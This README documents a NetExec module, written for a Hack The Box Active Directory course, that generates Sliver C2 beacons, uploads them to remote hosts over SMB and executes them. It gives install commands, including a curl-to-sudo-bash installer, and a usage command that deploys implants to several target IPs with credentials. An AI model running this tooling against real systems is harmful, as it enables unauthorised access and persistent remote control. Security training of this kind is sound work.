# Sliver NetExec Module

This is a NetExec (formerly CrackMapExec) module that generates unique Sliver beacons and executes them on remote Windows/Linux targets via SMB.

## What it does

The `sliver_exec` module:
- Connects to a Sliver C2 server
- Generates unique implant beacons for target systems
- Uploads the implants to remote targets using SMB
- Executes the implants to establish persistent C2 beacons (Windows-only)
- Optionally waits for beacon check-in and cleans up artifacts

## Features

- Automatic OS and architecture detection
- Support for Windows and Linux targets
- Unique implant generation per execution
- Configurable cleanup and timeout options
- Direct SMB upload

## Requirements

- NetExec (nxc) installed
- Sliver C2 server running
- Valid Sliver client configuration
- sliver-py Python package

## Installation on HTB PwnBox

```bash
# Remove pip-installed netexec
sudo pip3 uninstall -yqq netexec

# Install netexec via pipx + Sliver SDK
sudo apt install -y pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
pipx inject netexec sliver-py

# Install Sliver
curl https://sliver.sh/install | sudo bash
cp .sliver-client/configs/${USER}_localhost.cfg .sliver-client/configs/default.cfg

# Tip: Add a bypass to proxychains to be able to reach the Sliver Server
echo "localnet 127.0.0.0/255.0.0.0" | sudo tee -a /etc/proxychains.conf
```

## Usage

### Basic usage:
Command
```bash
nxc smb 10.2.10.10 10.2.10.11 10.2.10.12 -u localuser -p password -M sliver_exec -o RHOST=192.168.1.100 RPORT=443
```
Output:

![](./assets/example.svg)

### Available options:
- `RHOST`: Target IP address (required)
- `RPORT`: Sliver listener port (default: 443)
- `OS`: Target OS (windows/linux, auto-detected if not specified)
- `ARCH`: Target architecture (amd64/386, auto-detected if not specified)
- `IMPLANT_BASE_PATH`: Local base path for temp files (default: /tmp)
- `CLEANUP`: Remove implant after execution (default: True)
- `WAIT`: Seconds to wait for beacon check-in (default: 30)
- `FORMAT`: Implant format (default: exe, only exe supported)

## Configuration

The module requires a Sliver client configuration file. By default, it looks for:
- `~/.sliver-client/configs/default.cfg`

You can specify a custom config path in your NetExec config under the `[Sliver]` section:
```ini
[Sliver]
config_path = /path/to/your/sliver/config.cfg
```

## Information

This module was written as an exercise as part of the CrackMapExec course in the **Active Directory Penetration Expert Course** on Hack The Box.

## Testing

Run the test suite:
```bash
python -m pytest tests/
```
